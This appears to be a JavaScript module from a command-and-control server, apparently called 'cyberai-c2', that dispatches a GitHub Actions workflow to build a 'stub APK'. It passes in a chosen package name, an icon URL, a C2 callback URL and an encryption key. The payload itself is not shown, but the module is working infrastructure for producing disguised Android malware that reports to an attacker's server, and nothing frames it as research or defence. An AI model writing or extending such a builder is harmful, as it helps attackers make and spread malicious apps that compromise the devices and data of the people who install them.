import { log } from '../utils.js';

/**
 * Trigger a GitHub Actions workflow to build the stub APK.
 * Uses the GitHub API with a personal access token.
 */
export async function triggerBuild(config, buildParams) {
  if (!config.githubToken || !config.githubRepo) {
    log('warn', 'GitHub not configured — APK build not triggered');
    return;
  }

  const [owner, repo] = config.githubRepo.split('/');
  if (!owner || !repo) {
    log('error', 'Invalid GITHUB_REPO format — expected owner/repo');
    return;
  }

  const url = `https://api.github.com/repos/${owner}/${repo}/actions/workflows/${config.githubWorkflow}/dispatches`;

  const body = {
    ref: 'main',
    inputs: {
      build_id: buildParams.buildId,
      package_name: buildParams.packageName,
      icon_url: buildParams.iconUrl || '',
      build_config: buildParams.buildConfig || 'release',
      c2_url: buildParams.c2Url,
      encryption_key: buildParams.encryptionKey || '',
    },
  };

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${config.githubToken}`,
        'Accept': 'application/vnd.github.v3+json',
        'Content-Type': 'application/json',
        'User-Agent': 'cyberai-c2/1.0',
      },
      body: JSON.stringify(body),
    });

    if (!response.ok) {
      const text = await response.text();
      throw new Error(`GitHub API responded with ${response.status}: ${text}`);
    }

    log('info', 'GitHub workflow dispatched', {
      buildId: buildParams.buildId,
      repo: config.githubRepo,
    });

    // GitHub doesn't return a run ID in the dispatch response.
    // The workflow itself should call back to our webhook with the run ID.
  } catch (err) {
    log('error', 'Failed to trigger GitHub workflow', {
      error: err.message,
      buildId: buildParams.buildId,
    });
    throw err;
  }
}
